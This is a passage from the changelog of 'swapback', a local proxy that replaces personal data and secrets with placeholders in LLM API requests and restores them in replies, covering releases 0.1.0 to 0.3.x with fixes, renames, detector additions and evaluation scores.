  sets declared as packages, more keywords. README links and images are absolute so they also work on PyPI.
- README: Responses API streams moved from "doesn't catch yet" to restored; the stale "203 tests" line no longer
  carries a count. SECURITY.md: 0.3.x is the supported line.

### Upgrading
- If one of your egress-named tools must receive real values (your own mail tool, say), add it to
  `tool_restore.allow`. Otherwise it now receives placeholders.

## [0.2.1] - 2026-11-09

### Added
- `--help` (`-h`) and `--version` on both commands. `swapback-proxy --help` says what the proxy does, which config it
  reads (`SWAPBACK_CONFIG`, with the deprecated `PII_SCRUBBER_CONFIG` fallback), how to change the listen address
  (`SWAPBACK_LISTEN` or `listen:`), and points to `swapback check-config` and `swapback health`.
  `swapback COMMAND --help` describes each command.

### Changed
- README: a short "What it doesn't catch yet" list at the top of Limits, checked against this release (unlisted names,
  most date-of-birth forms, non-US national IDs, most non-US addresses, free-form secrets, Responses API streams).
- SECURITY.md: 0.2.x is the supported line, and reporters without the private-report button are asked to open an
  issue requesting a private contact, with no details.
- CI: `actions/checkout@v7` and `actions/setup-python@v7` (Node 24), so the runs no longer print the Node 20
  deprecation warning.

### Fixed
- `swapback-proxy --help`, or any other argument, started the proxy on 127.0.0.1:8787. Help and version now print and
  exit without loading the config or opening a port; an unknown option or argument prints the usage and exits with
  status 2. With no arguments the proxy starts as before.
- `swapback` with an unknown command printed the module notes and exited 0; it now prints the usage and an error and
  exits 2. `--help` no longer needs a loadable config.

## [0.2.0] - 2026-11-09

### Changed
- **Renamed from pii-scrubber to swapback.** The package is now `swapback` (`import swapback`), the commands are
  `swapback` and `swapback-proxy`, the environment variables are `SWAPBACK_*`, the config file is `swapback.yaml`
  (example: `swapback.example.yaml`), the default state directory is `~/.local/state/swapback`, and the repository is
  `github.com/rmpmrepo1278/swapback`. The old `PII_SCRUBBER_*` variables are still read as a fallback when the new one
  is unset (deprecated). Move an existing state directory by hand if you want to keep its vault. The `«PERSON_1»`
  placeholder format is unchanged. The 0.1.1 fixes below ship in this release.


### Fixed
- **Flaky proxy test (CI, Python 3.13).** The proxy tests picked two "free" ports by binding and releasing them, and the kernel can hand the same port back twice (4 in 100,000 tries on Linux). When the proxy's port equalled the mock upstream's, the proxy could not start and the test talked to the mock directly, which looked like a leak. Each test now gets its own mock upstream on a kernel-picked port with its own list of received requests, the proxy listens on port 0 and reports its port, and the fixture fails loudly unless the scrubber itself answers. The proxy code was not at fault; new tests pin every `/v1/completions` prompt shape (string, list, nested, token ids; streamed or not).
- **Anthropic Messages streams are restored.** `/v1/messages` SSE replies get their placeholders swapped back delta by
  delta (`text_delta`, and `input_json_delta` for `tool_use` input), including a placeholder split across deltas; held
  text is flushed before its `content_block_stop`. Before, agents in Anthropic mode showed `«PERSON_1»` in replies.
- **Written variants of a known value no longer leak.** A listed multi-word value is also matched when its words are
  joined by any whitespace run (non-breaking, repeated, tabs), zero-width characters, `.`, `_`, `-` or `%20`, and the
  post-swap egress re-check uses the same rule, so a variant that slips is blocked (`503`). Private terms use the same rule.
- **All-caps and other case variants are the same person.** Every variant of a listed value or private term shares one
  placeholder (before, `JANE DOE` became a second `«PERSON_n»`). The reply still gets back the exact form that was
  written, from a per-request record of surface forms (`Forms`).

### Added
- `evals/run_holdout.py` and a regression test: the patterns-only score on `evals/holdout3.json`, published in the
  README (10/42 positives in 0.1.0, 16/42 in 0.1.1; 22/22 negatives untouched; 64/64 exact round trips).
- Generic detection rules: emails written with bracketed at/dot (`name [at] example [dot] org`, `name(at)example.org`),
  with a full-width or small `@` or hidden zero-width characters; IPv6 addresses (validated, loopback skipped).
- README: setup for a real provider (copy the example files, set `private_terms_file`, edit `known.yaml` before
  starting, `upstream` is a base URL without `/v1`), "Use with agents" with a tested OpenClaw provider block, what a
  block looks like inside an agent, and how to check what the provider saw.

### Changed
- `evals/holdout3.json`: the one SSN-shaped value now uses the reserved 987-65-43xx range.

### Added (docs release)
- README rewrite: quickstart, architecture, configuration, comparison with similar projects, limits, security notes.
- Logo, banner, architecture and before/after graphics in `docs/assets/`.
- `examples/quickstart.yaml`, `examples/known.demo.yaml` and `examples/curl_demo.sh`.
- CONTRIBUTING, SECURITY, CODE_OF_CONDUCT, issue and pull request templates.
- GitHub Actions workflow running the tests and the smoke test on Python 3.11, 3.12 and 3.13.
- `evals/holdout3.json`: 64 synthetic detection cases.

## [0.1.0] - 2026-11-08

### Added
- OpenAI-compatible HTTP proxy (`swapback-proxy`) that swaps known values and detected PII for stable placeholders
  before a request leaves the machine and restores them in the reply: plain JSON, OpenAI chat-completion SSE streams and
  tool-call arguments.
- Known-values file with typed entries and written-variant matching; private terms and money figures.
- Detectors: `phonenumbers`, Microsoft Presidio predefined patterns, gitleaks default secret rules, local rules.
- Fail-closed behaviour: scrub errors, unreadable bodies and known values left after the swap answer `503`.
- File-path exemption for known names that are path segments.
- Local vault (mode 0600), counts-only request log, health endpoint, alert webhook, `canary` self-test, CLI.

### Fixed
- JSON request bodies are scrubbed whatever their `Content-Type`.
- Restored values are returned exactly as written (for example a phone number keeps its original format).
